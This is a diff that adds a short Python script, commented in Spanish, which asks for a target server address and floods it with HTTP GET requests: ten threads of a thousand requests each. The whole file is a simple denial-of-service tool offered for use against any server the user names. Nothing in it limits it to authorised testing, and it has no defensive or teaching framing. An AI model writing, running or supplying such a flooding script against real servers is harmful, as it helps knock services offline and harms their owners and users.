@@ -1,0 +1,38 @@
+#!/usr/bin/env python3
+
+import sys
+import requests
+from time import sleep
+from threading import Thread
+
+# Solicitar la dirección IP del servidor objetivo al usuario
+input_url = input("Introduce la dirección IP del servidor objetivo: ")
+if not input_url.startswith("http://") and not input_url.startswith("https://"):
+    TARGET_URL = "http://" + input_url
+else:
+    TARGET_URL = input_url
+
+# Número de solicitudes a enviar en cada hilo
+REQUEST_COUNT = 1000
+
+def send_requests():
+    for _ in range(REQUEST_COUNT):
+        try:
+            requests.get(TARGET_URL)
+            print("Solicitud enviada.")
+        except requests.RequestException:
+            print("Error al enviar la solicitud.")
+        sleep(0.1)  # Pausa entre solicitudes para evitar el bloqueo de la red
+
+threads = []
+
+# Número de hilos para ejecutar
+THREAD_COUNT = 10
+
+for _ in range(THREAD_COUNT):
+    thread = Thread(target=send_requests)
+    thread.start()
+    threads.append(thread)
+
+for thread in threads:
+    thread.join()
